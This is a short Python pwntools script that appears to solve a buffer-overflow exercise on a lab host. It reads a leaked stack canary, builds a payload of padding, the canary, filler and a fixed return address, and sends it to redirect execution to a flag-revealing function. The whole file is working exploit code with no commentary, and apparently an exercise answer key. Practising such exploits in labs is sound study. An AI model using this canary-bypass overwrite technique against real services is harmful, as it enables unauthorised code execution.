import pwn

target = 'oblig1.bufferoverflow.no'
port = '7003'

buffer_to_canary_dst = b'24'
bufferfill = b'A' * int(buffer_to_canary_dst)
return_p_offset = b'B' * 8 * 1
expose_flag_adr = pwn.p64(0x4011a7)

p = pwn.remote(target, port)

print(p.recvline())
p.send(buffer_to_canary_dst + b'\n')

print(p.recvline())
read_canary = p.recvline()
print(b'Canary: ' + read_canary)

canary_val = pwn.p64(int(read_canary, 16))

payload = bufferfill + canary_val + return_p_offset + expose_flag_adr + b'\n'

p.send(payload)

p.interactive()
p.close()